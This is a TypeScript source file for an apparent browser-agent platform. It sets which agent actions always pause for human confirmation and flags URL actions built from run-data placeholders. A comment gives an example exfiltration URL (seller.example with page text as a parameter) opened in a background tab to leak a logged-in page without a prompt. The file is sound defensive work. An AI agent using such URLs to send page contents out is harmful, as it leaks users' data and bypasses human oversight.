// ============================================================
// TASKPILOT SHARED — CONFIRMATION POLICY
// packages/shared/src/confirmation.ts
//
// Which steps must pause for a human "yes" is a PLATFORM decision, not the
// agent author's. A manifest's `harness.require_confirmation` may ADD actions
// to the set; it can never remove one of these. The server and the extension
// both apply this, so neither has to trust the other's copy of the list.
// ============================================================

import type { BrowserAction, BrowserActionType } from "./types/runtime";

/** Always confirmed, whatever the manifest says. */
export const PLATFORM_CONFIRM: readonly BrowserActionType[] = [
  "navigate",
  "download_file",
  "upload_file",
  "push_integration",
];

/** Actions whose `params.url` sends the browser somewhere. */
export const URL_ACTIONS: readonly BrowserActionType[] = ["navigate", "open_tab", "download_file"];

const PLACEHOLDER = /\{\{[^}]*\}\}/;

/** The platform minimum plus whatever the agent asked for on top. */
export function effectiveConfirmSet(extra: readonly BrowserActionType[] = []): Set<BrowserActionType> {
  return new Set<BrowserActionType>([...PLATFORM_CONFIRM, ...extra]);
}

/** Normalise a manifest's list so the stored copy always carries the minimum. */
export function withPlatformConfirm(list: readonly BrowserActionType[] = []): BrowserActionType[] {
  return [...effectiveConfirmSet(list)];
}

/**
 * True when a step must be confirmed before it runs.
 *
 * Besides the confirm set, ANY url-carrying step whose URL is built from run
 * data (`{{…}}`) is confirmed. Otherwise an agent could read a logged-in page
 * and open `https://seller.example/?d={{page.visible_text}}` in a background
 * tab — exfiltrating it without a prompt. Pass the action as written in the
 * plan (before interpolation): that is what reveals the placeholder.
 */
export function needsConfirmation(
  action: Pick<BrowserAction, "type" | "params">,
  confirm: ReadonlySet<BrowserActionType> | readonly BrowserActionType[]
): boolean {
  const set = confirm instanceof Set ? confirm : effectiveConfirmSet(confirm as readonly BrowserActionType[]);
  if (set.has(action.type) || PLATFORM_CONFIRM.includes(action.type)) return true;

  const url = action.params?.url;
  return URL_ACTIONS.includes(action.type) && typeof url === "string" && PLACEHOLDER.test(url);
}
